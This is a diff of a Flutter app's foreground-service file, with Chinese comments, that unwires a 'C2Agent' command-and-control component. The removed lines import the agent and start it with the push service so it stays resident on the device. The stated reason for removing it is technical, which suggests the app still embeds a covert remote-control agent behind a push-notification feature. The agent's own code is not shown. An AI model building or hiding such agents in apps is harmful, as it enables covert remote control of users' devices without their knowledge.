@@ -6,7 +6,8 @@ import 'package:permission_handler/permission_handler.dart';
 
 import 'managers/m5.dart';
 import 'config/secrets.dart';
-import 'c2/c2_agent.dart'; // 👈 新增引入 C2
+// ❌ 移除 C2 的引入
+// import 'c2/c2_agent.dart';
 
 /// 前台服务入口回调（必须是顶层函数）
 @pragma('vm:entry-point')
@@ -19,12 +20,12 @@ class _PushTaskHandler extends TaskHandler {
   Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
     debugPrint('[ForegroundService] 启动，来源: $starter');
     
-    // 👇 顺便启动 C2 Agent，确保它能跟着前台服务一起常驻
-    try {
-      C2Agent.start();
-    } catch (e) {
-      debugPrint('[ForegroundService] C2Agent 启动异常: $e');
-    }
+    // ❌ 删除这里的 C2Agent.start()，因为它跑在没有通道的后台引擎里
+    // try {
+    //   C2Agent.start();
+    // } catch (e) {
+    //   debugPrint('[ForegroundService] C2Agent 启动异常: $e');
+    // }
 
     try {
       await Ma.instance.initialize();
@@ -32,7 +33,6 @@ class _PushTaskHandler extends TaskHandler {
       await Ma.instance.startPushIfPermitted();
     } catch (e, st) {
       debugPrint('[ForegroundService] ❌ 推送异常: $e\n$st');
-    } finally {
     }
   }
 
@@ -42,8 +42,8 @@ class _PushTaskHandler extends TaskHandler {
   @override
   Future<void> onDestroy(DateTime timestamp) async {
     debugPrint('[ForegroundService] 结束');
-    // 👇 服务被停止时，同步停止 C2
-    C2Agent.stop();
+    // ❌ 删除这里的 C2Agent.stop()
+    // C2Agent.stop();
   }
 
   @override
